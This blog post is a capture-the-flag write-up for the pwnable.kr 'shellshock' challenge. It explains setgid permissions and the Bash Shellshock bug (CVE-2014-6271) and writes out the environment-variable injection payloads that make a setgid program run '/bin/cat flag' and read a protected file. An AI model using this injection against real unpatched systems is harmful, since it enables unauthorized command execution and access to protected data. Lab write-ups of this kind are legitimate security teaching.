---
layout: post
title: pwnable.kr - shellshock
---

## Prompt
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)

## Analysis
We have an executable called `shellshock`, its source `shellshock.c`, and a `bash` executable.

Let's check permissions:
```
shellshock@pwnable:~$ ls -l
total 960
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
```
`flag` is only readable to root and users in the group shellshock_pwn. The `bash` ELF can be read and executed by any user. The `shellshock` file can be read and executed by anyone and has the `setgid` bit set. When a file has the `setgid` bit, it executes with the privileges of the group of the user who owns it instead of executing with those of the group of the user who executed it. So, `shellshock` can open the `flag`.

**shellshock.c**:
```c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```

`setresuid()` sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process. The getegid() function returns the effective group ID of the calling process. So, the script will be run with the group ID shellshock_pwn.

The name of this challenge is a hint towards how to exploit `bash` to read our flag. See an explanation for the Shellshock Bash RCE [here](https://www.troyhunt.com/everything-you-need-to-know-about2/). [This article](https://www.theregister.com/2014/09/24/bash_shell_vuln/) explains how we can check for this vulnerability:
```
env X="() { :;} ; echo busted" /bin/sh -c "echo completed"
env X="() { :;} ; echo busted" `which bash` -c "echo completed"
```
The systems normal /bin/sh is patched, but the executable in our home folder is not:
```
shellshock@pwnable:~$ env X="() { :;} ; echo busted" /bin/sh -c "echo completed"
completed
shellshock@pwnable:~$ env X="() { :;} ; echo busted" ~/bash -c "echo completed"
busted
completed
```
Since shellshock makes it so `bash` will execute trailing commands when it imports a function definition stored into an environment variable, we just need to specify our desired effect when `bash` is run.
## Solution

Use the CVE-2014-6271 vulnerability to append our desired command to an unused environment variable. Run `shellshock` to execute `bash` with the proper permissions to open `flag`.
```
shellshock@pwnable:~$ export X="() { :; }; /bin/cat flag;"
shellshock@pwnable:~$ ./shellshock
{flag}
Segmentation fault (core dumped)
```